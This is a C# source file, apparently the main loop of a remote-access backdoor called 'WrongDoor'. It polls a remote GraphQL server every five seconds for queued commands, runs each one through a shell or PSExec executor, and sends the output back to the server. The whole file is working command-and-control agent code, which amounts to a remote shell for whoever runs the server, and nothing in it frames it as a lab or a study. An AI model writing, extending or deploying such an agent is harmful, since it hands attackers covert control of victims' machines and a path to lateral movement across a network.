using System;
using System.Threading.Tasks;
using WrongDoor.Connector;
using WrongDoor.MainServer.CommandExutors;

namespace WrongDoor.MainServer
{
    internal class Program
    {
        static async Task Main()
        {
            await Recive();
        }

        static async Task<string> ExecuteCommandBasedOnType(GetCommandsGQL.Response.CommandSelection command)
        {
            switch(command.type)
            {
                case (CommandType.CMD):
                    return await new CommandLineExecutor().Execute(command);
                case (CommandType.PSEXEC):
                    return await new PSExecExecutor().Execute(command);
                default:
                    return $"Command type: {command.type} not founded";
            }
        }

        static async Task Recive()
        {
            while (true)
            {
                var commands = (await GetCommandsGQL.SendQueryAsync(
                    ClientHandler.Client, 
                    new GetCommandsGQL.Variables { execute_statement = false })
                ).Data.Commands;

                foreach (var command in commands)
                {
#if DEBUG
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"New instruction from, with type: {command.type}, execution time: '{command.time}'");
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Command : '{command.body}'");
#endif

                    var output = await ExecuteCommandBasedOnType(command);

                    var report = new LogsMessageInput { commandId = command.id, message = output };

                    await AddLogMessageGQL.SendMutationAsync(ClientHandler.Client, new AddLogMessageGQL.Variables { log = report });
                }
                await Task.Delay(5000);
            }
        }
    }
}
